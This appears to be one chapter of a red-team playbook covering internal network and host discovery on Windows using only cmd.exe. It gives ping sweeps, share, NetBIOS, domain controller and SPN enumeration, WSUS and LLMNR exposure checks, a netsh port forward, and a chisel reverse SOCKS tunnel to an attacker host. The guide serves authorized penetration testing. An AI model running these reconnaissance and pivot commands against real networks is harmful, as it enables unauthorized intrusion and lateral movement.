# Phase 2: Network & Host Discovery — Commands & Scripts

CMD-only access — no PowerShell, no pre-existing pivot tooling assumed.

## Legend

| Tag | Meaning |
|---|---|
| 🟩 **NATIVE CMD** | Built into Windows cmd.exe — zero extra tools or setup |
| 🟨 **EXTERNAL BINARY REQUIRED** | Requires a file transferred onto the target host first |
| 🟥 **REQUIRES ADMIN / CHANGES HOST STATE** | Needs local admin and/or alters host config — noisy |
| ⬛ **LIMITATION** | Cannot be done from cmd.exe alone — noted so the capability gap is explicit |

---

## 2.1 Host Discovery & Port Scanning

### Ping sweep of a subnet
🟩 Native CMD
```cmd
for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | find "Reply" >> alive_hosts.txt

type alive_hosts.txt
```

### Single-port connectivity check
🟩 Native CMD
```cmd
telnet 10.10.10.5 445
```
🟥 Requires admin / changes host state
```cmd
dism /online /Enable-Feature /FeatureName:TelnetClient
```
🟨 External binary required
```cmd
portqry.exe -n 10.10.10.5 -e 445
```

### True multi-port / service-version scanning
⬛ Limitation — not possible with pure cmd.exe built-ins. Requires an external binary or a pivot (SOCKS proxy) back to an attacker box running nmap. Host-alive + NetBIOS fingerprinting below is the closest cmd-only substitute.

---

## 2.2 Host & Service Fingerprinting (No Port Scan Needed)

### List computers in the domain
🟩 Native CMD
```cmd
net view /domain
```

### List shares on a discovered host
🟩 Native CMD
```cmd
net view \\10.10.10.5
```

### NetBIOS name table (reveals host role)
🟩 Native CMD
```cmd
nbtstat -A 10.10.10.5
```
Useful codes: `<1C>` = Domain Controller, `<00>` = Workstation/Server service, `<20>` = File Server service running.

---

## 2.3 Identify Domain Controllers

🟩 Native CMD
```cmd
nltest /dsgetdc:
nltest /dclist:<domainname>
nslookup -type=srv _ldap._tcp.dc._msdcs.<domainname>
echo %LOGONSERVER%
```

---

## 2.4 Identify SQL / Exchange / RDP / WinRM Servers via SPN

🟩 Native CMD
```cmd
setspn -T <domainname> -Q MSSQLSvc/*
setspn -T <domainname> -Q exchangeMDB/*
setspn -T <domainname> -Q TERMSRV/*
setspn -T <domainname> -Q WSMAN/*
```
`setspn.exe` is a standard Windows binary — query mode works without RSAT on most domain-joined hosts.

---

## 2.5 WSUS Configuration Check

🟩 Native CMD
```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v UseWUServer
```
A `WUServer` value starting with `http://` (not `https://`) flags unencrypted WSUS — a known SYSTEM-level code execution path if update traffic can be intercepted.

⬛ Limitation — exploitation (e.g. WSUXploit-style attacks) requires a MITM position and external attacker-machine tooling, not achievable from target cmd.exe alone.

---

## 2.6 NetBIOS / LLMNR Exposure Check

🟩 Native CMD
```cmd
ipconfig /all
REM Look for "NetBIOS over Tcpip" line under each adapter

reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces" /s | find "NetbiosOptions"
```

⬛ Limitation — LLMNR/NBT-NS poisoning (Responder-style attacks) requires attacker-machine tooling actively listening on the wire. The commands above only confirm whether the protocol is enabled as a prerequisite.

---

## 2.7 Network Segmentation Testing

🟩 Native CMD
```cmd
ping 10.20.20.1
ping 10.30.30.1

route print

netstat -ano
```

---

## 2.8 Closing the Gap — Minimal-Footprint Pivot Options

True port/service scanning and poisoning attacks need either a dropped binary or a pivot back to an attacker machine.

### Native Windows port forwarding (no external binary)
🟥 Requires admin / changes host state
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.10.5
netsh interface portproxy show all
```
Built into Windows — usable for simple port forwarding, not a full SOCKS proxy.

### Single static binary pivot (if any file transfer is possible)
🟨 External binary required
```cmd
chisel.exe client <attacker-ip>:8000 R:socks
```
One binary sets up a reverse SOCKS proxy back to the attacker machine, re-enabling nmap/CrackMapExec/Responder usage from your own box.

---

## Operational Notes

- This phase assumes cmd.exe-only access with no PowerShell and no pre-existing pivot tooling.
- NATIVE-tagged commands require zero setup and are the safest starting point.
- EXTERNAL BINARY and ADMIN-tagged actions increase footprint and detection risk — confirm authorization for the target tier per the RoE before running them.
